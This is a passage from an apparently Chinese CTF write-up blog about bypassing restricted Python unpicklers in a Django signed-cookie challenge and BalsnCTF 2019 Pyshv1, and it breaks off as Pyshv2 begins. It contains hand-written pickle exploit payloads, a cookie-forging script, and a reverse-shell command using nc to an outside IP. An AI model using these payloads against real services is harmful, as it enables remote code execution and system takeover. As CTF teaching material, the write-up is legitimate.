    <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %</span><br><span class="line">                                     (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PickleSerializer</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dumps</span>(<span class="params">self, obj</span>):</span></span><br><span class="line">        <span class="keyword">return</span> pickle.dumps(obj)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">loads</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(data, <span class="built_in">str</span>):</span><br><span class="line">                <span class="keyword">raise</span> TypeError(<span class="string">&quot;Can&#x27;t load pickle from unicode string&quot;</span>)</span><br><span class="line">            file = io.BytesIO(data)</span><br><span class="line">            <span class="keyword">return</span> RestrictedUnpickler(file,</span><br><span class="line">                              encoding=<span class="string">&#x27;ASCII&#x27;</span>, errors=<span class="string">&#x27;strict&#x27;</span>).load()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>和setting文件里的特殊配置</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SESSION_ENGINE = <span class="string">&#x27;django.contrib.sessions.backends.signed_cookies&#x27;</span></span><br><span class="line">SESSION_SERIALIZER = <span class="string">&#x27;core.serializer.PickleSerializer&#x27;</span></span><br></pre></td></tr></table></figure>

<p>查阅django文档发现</p>
<p> <a target="_blank" rel="noopener" href="https://docs.djangoproject.com/zh-hans/3.0/topics/http/sessions/#using-cookie-based-sessions">https://docs.djangoproject.com/zh-hans/3.0/topics/http/sessions/#using-cookie-based-sessions</a> </p>
<p>可以确定,这里是通过读取secret_key来构造恶意cookie来pickle反序列化命令执行</p>
<p>我们跟进django.contrib.sessions.backends.signed_cookies来了解如何生成储存session的cookie(这里花了我很久的时间,从尝试看一步一步调试到看调用堆栈再到查文档最后才搞清楚过程,建议自己尝试)</p>
<p>在理解之后便有一下生成恶意cookie的代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> django.utils <span class="keyword">import</span> baseconv</span><br><span class="line"><span class="keyword">from</span> django.utils.crypto <span class="keyword">import</span> constant_time_compare, salted_hmac</span><br><span class="line"><span class="keyword">from</span> django.utils.encoding <span class="keyword">import</span> force_bytes</span><br><span class="line"><span class="keyword">from</span> django.utils.module_loading <span class="keyword">import</span> import_string</span><br><span class="line"><span class="keyword">from</span> django <span class="keyword">import</span> core</span><br><span class="line"><span class="keyword">from</span> django.core <span class="keyword">import</span> signing</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">myexp=<span class="string">b&#x27;&#x27;&#x27;cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRp100</span></span><br><span class="line"><span class="string">cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">p101</span></span><br><span class="line"><span class="string">(g100</span></span><br><span class="line"><span class="string">S&#x27;get&#x27;</span></span><br><span class="line"><span class="string">tR(S&#x27;builtins&#x27;</span></span><br><span class="line"><span class="string">tRp103</span></span><br><span class="line"><span class="string">g101</span></span><br><span class="line"><span class="string">(g103</span></span><br><span class="line"><span class="string">S&#x27;eval&#x27;</span></span><br><span class="line"><span class="string">tR(S&#x27;eval(\&#x27;\&#x27;\&#x27;__import__(&#x27;os&#x27;).system(&#x27;nc -e &quot;cmd.exe /K&quot; 39.108.164.219 60000 -d&#x27;)\&#x27;\&#x27;\&#x27;)&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pickle_exp</span>(<span class="params">SECRET_KEY</span>):</span></span><br><span class="line">    data = myexp</span><br><span class="line">    compress=<span class="literal">True</span></span><br><span class="line">    <span class="comment"># Flag for if it&#x27;s been compressed or not</span></span><br><span class="line">    is_compressed = <span class="literal">False</span></span><br><span class="line">    salt=<span class="string">&#x27;django.contrib.sessions.backends.signed_cookies&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> compress:</span><br><span class="line">        <span class="comment"># Avoid zlib dependency unless compress is being used</span></span><br><span class="line">        compressed = zlib.compress(data)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(compressed) &lt; (<span class="built_in">len</span>(data) - <span class="number">1</span>):</span><br><span class="line">            data = compressed</span><br><span class="line">            is_compressed = <span class="literal">True</span></span><br><span class="line">    base64d = signing.b64_encode(data).decode()</span><br><span class="line">    <span class="keyword">if</span> is_compressed:</span><br><span class="line">        base64d = <span class="string">&#x27;.&#x27;</span> + base64d</span><br><span class="line">    <span class="built_in">print</span>(signing.TimestampSigner(key=SECRET_KEY, salt=salt).sign(base64d))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pickle_exp(<span class="string">&quot;asdasdasdasdas&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>接下来就是如何构造恶意的pickle代码的问题了</p>
<p>题目限制了只能加载builtins里的属性</p>
<p>且属性名不能为以下内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blacklist = &#123;&#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;execfile&#x27;, &#x27;compile&#x27;, &#x27;open&#x27;, &#x27;input&#x27;, &#x27;__import__&#x27;, &#x27;exit&#x27;&#125;</span><br></pre></td></tr></table></figure>

<p>利用<code>__reduce__</code>来生成pickle代码已经无法满足要求了,我们不得不手写pickle代码,怎么手写就不详细讲了</p>
<p>我们现在把目光聚焦在如何构造利用链上</p>
<p>builtins的属性(删除部分)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;__build_class__&#x27;</span>, <span class="string">&#x27;__debug__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;all&#x27;</span>, <span class="string">&#x27;any&#x27;</span>, <span class="string">&#x27;ascii&#x27;</span>, <span class="string">&#x27;bin&#x27;</span>, <span class="string">&#x27;bool&#x27;</span>, <span class="string">&#x27;breakpoint&#x27;</span>, <span class="string">&#x27;bytearray&#x27;</span>, <span class="string">&#x27;bytes&#x27;</span>, <span class="string">&#x27;callable&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;classmethod&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;complex&#x27;</span>, <span class="string">&#x27;copyright&#x27;</span>, <span class="string">&#x27;credits&#x27;</span>, <span class="string">&#x27;delattr&#x27;</span>, <span class="string">&#x27;dict&#x27;</span>, <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;divmod&#x27;</span>, <span class="string">&#x27;enumerate&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>, <span class="string">&#x27;filter&#x27;</span>, <span class="string">&#x27;float&#x27;</span>, <span class="string">&#x27;format&#x27;</span>, <span class="string">&#x27;frozenset&#x27;</span>, <span class="string">&#x27;getattr&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>, <span class="string">&#x27;hasattr&#x27;</span>, <span class="string">&#x27;hash&#x27;</span>, <span class="string">&#x27;help&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>, <span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;isinstance&#x27;</span>, <span class="string">&#x27;issubclass&#x27;</span>, <span class="string">&#x27;iter&#x27;</span>, <span class="string">&#x27;len&#x27;</span>, <span class="string">&#x27;license&#x27;</span>, <span class="string">&#x27;list&#x27;</span>, <span class="string">&#x27;locals&#x27;</span>, <span class="string">&#x27;map&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;memoryview&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;next&#x27;</span>, <span class="string">&#x27;object&#x27;</span>, <span class="string">&#x27;oct&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;ord&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;print&#x27;</span>, <span class="string">&#x27;property&#x27;</span>, <span class="string">&#x27;quit&#x27;</span>, <span class="string">&#x27;range&#x27;</span>, <span class="string">&#x27;repr&#x27;</span>, <span class="string">&#x27;reversed&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;set&#x27;</span>, <span class="string">&#x27;setattr&#x27;</span>, <span class="string">&#x27;slice&#x27;</span>, <span class="string">&#x27;sorted&#x27;</span>, <span class="string">&#x27;staticmethod&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;sum&#x27;</span>, <span class="string">&#x27;super&#x27;</span>, <span class="string">&#x27;tuple&#x27;</span>, <span class="string">&#x27;type&#x27;</span>, <span class="string">&#x27;vars&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>我们查看builtins的属性我们发现两个有意思的东西,一个是getattr,另一个是globals</p>
<p>虽然限制我们属性名不能为eval啥的,但是并没有限制不能出现在参数处</p>
<p>所以<code>getattr(builtins,&quot;eval&quot;)</code>便能得到eval方法了</p>
<p>但是看pickle的操作码并没有发现能直接导入一个模块的操作,在结合globals我们很容易想到<code>getattr(getattr(globals(),&quot;builtins&quot;),&quot;eval&quot;)</code></p>
<p>最后的payload:<code>builtins.getattr(builtins.getattr(builtins.globals(),&quot;builtins&quot;),&quot;eval&quot;)(&quot;evil code&quot;)</code></p>
<p>其对应的pickle代码是</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRp100</span></span><br><span class="line"><span class="string">cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">p101</span></span><br><span class="line"><span class="string">(g100</span></span><br><span class="line"><span class="string">S&#x27;get&#x27;</span></span><br><span class="line"><span class="string">tR(S&#x27;builtins&#x27;</span></span><br><span class="line"><span class="string">tRp103</span></span><br><span class="line"><span class="string">g101</span></span><br><span class="line"><span class="string">(g103</span></span><br><span class="line"><span class="string">S&#x27;eval&#x27;</span></span><br><span class="line"><span class="string">tR(S&#x27;eval(\&#x27;\&#x27;\&#x27;__import__(&#x27;os&#x27;).system(&#x27;nc -e &quot;cmd.exe /K&quot; 39.108.164.219 60000 -d&#x27;)\&#x27;\&#x27;\&#x27;)&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>最后就差secret_key了,看别人的wp都是调试易得易得secret_key//</p>
<p>但是我是没找到,于是自己写了个过滤器</p>
<p>递归查找settings</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http.response <span class="keyword">import</span> HttpResponse, HttpResponseRedirect</span><br><span class="line"><span class="keyword">from</span> django.template <span class="keyword">import</span> engines</span><br><span class="line"><span class="keyword">from</span> django.contrib.auth <span class="keyword">import</span> login <span class="keyword">as</span> auth_login, get_user_model, authenticate</span><br><span class="line"><span class="keyword">from</span> django.contrib.auth.views <span class="keyword">import</span> LoginView, logout_then_login</span><br><span class="line"><span class="keyword">from</span> django.contrib.auth.decorators <span class="keyword">import</span> login_required</span><br><span class="line"><span class="keyword">from</span> django.views <span class="keyword">import</span> generic</span><br><span class="line"><span class="keyword">from</span> django <span class="keyword">import</span> template</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> django</span><br><span class="line"><span class="keyword">from</span> django <span class="keyword">import</span> template</span><br><span class="line">register = template.Library()</span><br><span class="line"></span><br><span class="line"><span class="meta">@register.filter</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_dict</span>(<span class="params">obj,way=<span class="string">&quot;&quot;</span>,depth=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> depth&gt;<span class="number">11</span>:</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    objdir=<span class="built_in">dir</span>(obj)</span><br><span class="line">    r=&#123;<span class="string">&quot;dict&quot;</span>:objdir,<span class="string">&quot;way&quot;</span>:way&#125;</span><br><span class="line">    result=<span class="string">&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> objdir:            </span><br><span class="line">        <span class="keyword">try</span> :</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;_&#x27;</span> == i[<span class="number">0</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">getattr</span>(obj, <span class="string">&#x27;__module__&#x27;</span>, <span class="literal">None</span>)!=<span class="literal">None</span> <span class="keyword">and</span> <span class="built_in">getattr</span>(obj, <span class="string">&#x27;__module__&#x27;</span>, <span class="literal">None</span>).split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>] == django.__name__:</span><br><span class="line">                result+=get_dict(<span class="built_in">getattr</span>(obj,i,<span class="literal">None</span>),way+<span class="string">&quot;.&quot;</span>+i,depth+<span class="number">1</span>) </span><br><span class="line">        <span class="keyword">except</span> TypeError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;SECRET_KEY&quot;</span> <span class="keyword">in</span> objdir <span class="keyword">or</span> <span class="string">&quot;settings&quot;</span> <span class="keyword">in</span> objdir:</span><br><span class="line">        <span class="built_in">print</span>(way)</span><br><span class="line">        <span class="keyword">return</span> result+way+<span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>

<p>这次是真的易得了:),至此结束</p>
<h3 id="BalsnCTF-2019-Pyshv1"><a href="#BalsnCTF-2019-Pyshv1" class="headerlink" title="BalsnCTF 2019 Pyshv1"></a>BalsnCTF 2019 Pyshv1</h3> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3 -u</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> securePickle <span class="keyword">as</span> pickle</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pickle.whitelist.append(<span class="string">&#x27;sys&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pysh</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.login()</span><br><span class="line">        self.cmds = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">self</span>):</span></span><br><span class="line">        user = <span class="built_in">input</span>().encode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">        user = codecs.decode(user, <span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError(<span class="string">&quot;Not Implemented QAQ&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            req = <span class="built_in">input</span>(<span class="string">&#x27;$ &#x27;</span>)</span><br><span class="line">            func = self.cmds.get(req, <span class="literal">None</span>)</span><br><span class="line">            <span class="keyword">if</span> func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;pysh: &#x27;</span> + req + <span class="string">&#x27;: command not found&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                func()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pysh = Pysh()</span><br><span class="line">    pysh.run()</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">whitelist = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">not</span> <span class="keyword">in</span> whitelist <span class="keyword">or</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">raise</span> KeyError(<span class="string">&#x27;The pickle is spoilt :(&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> pickle.Unpickler.find_class(self, module, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loads</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dumps = pickle.dumps</span><br></pre></td></tr></table></figure>

<p>只允许sys里的属性,而且属性里不能有.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;__displayhook__&#x27;, &#x27;__doc__&#x27;, &#x27;__excepthook__&#x27;, &#x27;__interactivehook__&#x27;, &#x27;__loader__&#x27;, &#x27;__name__&#x27;, &#x27;__package__&#x27;, &#x27;__spec__&#x27;, &#x27;__stderr__&#x27;, &#x27;__stdin__&#x27;, &#x27;__stdout__&#x27;, &#x27;_clear_type_cache&#x27;, &#x27;_current_frames&#x27;, &#x27;_debugmallocstats&#x27;, &#x27;_getframe&#x27;, &#x27;_git&#x27;, &#x27;_home&#x27;, &#x27;_xoptions&#x27;, &#x27;abiflags&#x27;, &#x27;api_version&#x27;, &#x27;argv&#x27;, &#x27;base_exec_prefix&#x27;, &#x27;base_prefix&#x27;, &#x27;builtin_module_names&#x27;, &#x27;byteorder&#x27;, &#x27;call_tracing&#x27;, &#x27;callstats&#x27;, &#x27;copyright&#x27;, &#x27;displayhook&#x27;, &#x27;dont_write_bytecode&#x27;, &#x27;exc_info&#x27;, &#x27;excepthook&#x27;, &#x27;exec_prefix&#x27;, &#x27;executable&#x27;, &#x27;exit&#x27;, &#x27;flags&#x27;, &#x27;float_info&#x27;, &#x27;float_repr_style&#x27;, &#x27;get_asyncgen_hooks&#x27;, &#x27;get_coroutine_wrapper&#x27;, &#x27;getallocatedblocks&#x27;, &#x27;getcheckinterval&#x27;, &#x27;getdefaultencoding&#x27;, &#x27;getdlopenflags&#x27;, &#x27;getfilesystemencodeerrors&#x27;, &#x27;getfilesystemencoding&#x27;, &#x27;getprofile&#x27;, &#x27;getrecursionlimit&#x27;, &#x27;getrefcount&#x27;, &#x27;getsizeof&#x27;, &#x27;getswitchinterval&#x27;, &#x27;gettrace&#x27;, &#x27;hash_info&#x27;, &#x27;hexversion&#x27;, &#x27;implementation&#x27;, &#x27;int_info&#x27;, &#x27;intern&#x27;, &#x27;is_finalizing&#x27;, &#x27;last_traceback&#x27;, &#x27;last_type&#x27;, &#x27;last_value&#x27;, &#x27;maxsize&#x27;, &#x27;maxunicode&#x27;, &#x27;meta_path&#x27;, &#x27;modules&#x27;, &#x27;path&#x27;, &#x27;path_hooks&#x27;, &#x27;path_importer_cache&#x27;, &#x27;platform&#x27;, &#x27;prefix&#x27;, &#x27;ps1&#x27;, &#x27;ps2&#x27;, &#x27;set_asyncgen_hooks&#x27;, &#x27;set_coroutine_wrapper&#x27;, &#x27;setcheckinterval&#x27;, &#x27;setdlopenflags&#x27;, &#x27;setprofile&#x27;, &#x27;setrecursionlimit&#x27;, &#x27;setswitchinterval&#x27;, &#x27;settrace&#x27;, &#x27;stderr&#x27;, &#x27;stdin&#x27;, &#x27;stdout&#x27;, &#x27;thread_info&#x27;, &#x27;version&#x27;, &#x27;version_info&#x27;, &#x27;warnoptions&#x27;]</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>发现有个modules,但是loads那里有一个死亡raise</p>
<p><code> sys._getframe</code> 可以返回带有exec的字典,但是好像没啥用</p>
<p>现在问题是不知道如何取出modules里的值</p>
<p>阅读文档发现</p>
<blockquote>
<p>This is a dictionary that maps module names to modules which have already been loaded. This can be manipulated to force reloading of modules and other tricks. However, replacing the dictionary will not necessarily work as expected and deleting essential items from the dictionary may cause Python to fail. </p>
</blockquote>
<p>可以修改modules来修改模块内容</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; import sys</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; sys.modules[<span class="string">&#x27;sys&#x27;</span>]=sys.modules</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; import sys</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; dir(sys)</span></span><br><span class="line">[&#x27;__class__&#x27;, &#x27;__contains__&#x27;, &#x27;__delattr__&#x27;, &#x27;__delitem__&#x27;, &#x27;__dir__&#x27;, &#x27;__doc__&#x27;, &#x27;__eq__&#x27;, &#x27;__format__&#x27;, &#x27;__ge__&#x27;, &#x27;__getattribute__&#x27;, &#x27;__getitem__&#x27;, &#x27;__gt__&#x27;, &#x27;__hash__&#x27;, &#x27;__init__&#x27;, &#x27;__init_subclass__&#x27;, &#x27;__iter__&#x27;, &#x27;__le__&#x27;, &#x27;__len__&#x27;, &#x27;__lt__&#x27;, &#x27;__ne__&#x27;, &#x27;__new__&#x27;, &#x27;__reduce__&#x27;, &#x27;__reduce_ex__&#x27;, &#x27;__repr__&#x27;, &#x27;__setattr__&#x27;, &#x27;__setitem__&#x27;, &#x27;__sizeof__&#x27;, &#x27;__str__&#x27;, &#x27;__subclasshook__&#x27;, &#x27;clear&#x27;, &#x27;copy&#x27;, &#x27;fromkeys&#x27;, &#x27;get&#x27;, &#x27;items&#x27;, &#x27;keys&#x27;, &#x27;pop&#x27;, &#x27;popitem&#x27;, &#x27;setdefault&#x27;, &#x27;update&#x27;, &#x27;values&#x27;]</span><br></pre></td></tr></table></figure>

<p>然后sys就被替换成sys.modules了,就可以拿到os了</p>
<p>然后再对sys.modules[‘sys’]再赋值为os</p>
<p>就可以import os了</p>
<p>(师傅们tql)</p>
<p>构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">csys</span><br><span class="line">modules</span><br><span class="line">S&#x27;sys&#x27;</span><br><span class="line">csys</span><br><span class="line">modules</span><br><span class="line">p100</span><br><span class="line">scsys</span><br><span class="line">get</span><br><span class="line">(S&#x27;os&#x27;</span><br><span class="line">tRp101</span><br><span class="line">g100</span><br><span class="line">S&#x27;sys&#x27;</span><br><span class="line">g101</span><br><span class="line">scsys</span><br><span class="line">system</span><br><span class="line">(S&#x27;dir&#x27;</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure>





<h3 id="BalsnCTF-2019-Pyshv2"><a href="#BalsnCTF-2019-Pyshv2" class="headerlink" title="BalsnCTF 2019 Pyshv2"></a>BalsnCTF 2019 Pyshv2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 